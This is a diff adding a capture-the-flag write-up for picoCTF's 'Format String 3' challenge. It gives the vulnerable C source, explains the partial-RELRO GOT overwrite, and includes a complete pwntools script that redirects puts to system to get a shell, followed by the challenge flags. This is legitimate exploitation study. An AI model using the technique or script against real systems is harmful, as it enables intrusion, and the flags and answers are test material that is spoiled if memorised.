@@ -2498,7 +2498,7 @@ Running it gives the flag
 Flag: picoCTF{and_down_the_road_we_go_856288fc}
 ```
 
-#### Heap 1
+#### Heap 3
 ![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/db9942f2-6ee0-4758-930c-15d2b4110167)
 
 This time around the source code is entirely different but yet similiar
@@ -2783,6 +2783,160 @@ Running it gives the flag
 ```
 Flag: picoCTF{f0rm47_57r?_f0rm47_m3m_741fa290}
 ```
+
+#### Format String 3
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c10409d7-837f-4a0c-8e03-f21c2e9c6e4c)
+
+We are given a binary, source code, libc, ld files and a remote instance to connect to
+
+First thing i did was to patch the binary with the provided libc file inorder to make sure that the offsets is the same as the one remotely
+
+Now looking at the source code i saw this
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9c2bd877-f3b9-4f56-bc7f-5fe96d668af2)
+
+```c
+#include <stdio.h>
+
+#define MAX_STRINGS 32
+
+char *normal_string = "/bin/sh";
+
+void setup() {
+        setvbuf(stdin, NULL, _IONBF, 0);
+        setvbuf(stdout, NULL, _IONBF, 0);
+        setvbuf(stderr, NULL, _IONBF, 0);
+}
+
+void hello() {
+        puts("Howdy gamers!");
+        printf("Okay I'll be nice. Here's the address of setvbuf in libc: %p\n", &setvbuf);
+}
+
+int main() {
+        char *all_strings[MAX_STRINGS] = {NULL};
+        char buf[1024] = {'\0'};
+
+        setup();
+        hello();
+
+        fgets(buf, 1024, stdin);
+        printf(buf);
+
+        puts(normal_string);
+
+        return 0;
+}
+```
+
+- Basically it does some buffering on stdin, stdout & stderr and this is defined in function `setup()` so we can just ignore that
+- Next it calls function `hello()` which would eventually give us a libc leak and that address is that of `setvbuf`
+- Then it receives our input which is stored in `buf` then prints it out
+- Before it returns it will basically print out "/bin/sh"
+
+From this we can tell that the vulnerability is format string bug since it prints out our input without a format specifier
+
+Ok now what's the attack strategy?
+
+Looking at the binary protections i got this
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ddd43129-5f8a-4592-88fe-9b6f10bb7fca)
+
+We are working with a 64bits binary which is dynamically linked and not stripped. The protections enabled are just Stack Canary and NX
+
+The fact that RELRO is partial makes the global offset table (GOT) to be writable 
+
+That means we can overwrite the GOT of any function available
+
+In the previous challenge we had to overwrite a global variable and the same way i got the offset is what i did here too
+
+Here's my fuzzing [script](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/picoctf/scripts/2024/Binary%20Exploitation/Format%20String%203/fuzz.py)
+
+Now that we know the offset what should we overwrite?
+
+At the end of the printf call we see that it calls `puts` on `/bin/sh`
+
+So we can overwrite `puts@got` to `system@libc`
+
+But how do we calculate the address of `system` in the `libc`?
+
+Remember that we've been given a libc leak so all i did was to first calculate the libc base address then got the address of system within libc
+
+With that after we perform the overwrite instead of it to call `puts` it would rather spawn a shell
+
+Here's my solve [script](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/picoctf/scripts/2024/Binary%20Exploitation/Format%20String%203/solve.py)
+
+```python
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+from warnings import filterwarnings
+
+# Set up pwntools for the correct architecture
+exe = context.binary = ELF('format-string-3_patched')
+libc = exe.libc
+
+filterwarnings("ignore")
+context.log_level = 'info'
+
+def start(argv=[], *a, **kw):
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE: 
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+gdbscript = '''
+init-pwndbg
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+
+def init():
+    global io
+
+    io = start()
+
+def solve():
+    offset = 38
+
+    io.recvuntil('libc: ')
+    setvbuf = int(io.recvline().strip(), 16)
+    print(setvbuf)
+    print(libc.sym['setvbuf'])
+    libc.address = setvbuf - libc.sym['setvbuf']
+    info("Libc base: %#x", libc.address)
+
+    system = libc.address + 0x4f760
+    write ={exe.got['puts']: system}
+
+    payload = fmtstr_payload(offset, write)
+    io.sendline(payload)
+
+    io.interactive()
+
+def main():
+    
+    init()
+    solve()
+
+if __name__ == '__main__':
+    main()
+
+```
+
+Running it works and i got the flag
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f9138bd7-6c61-470c-bff0-e8d68d5f6b68)
+
+```
+Flag: picoCTF{G07_G07?_d285a282}
+```
+
+
+
+
 
 
 
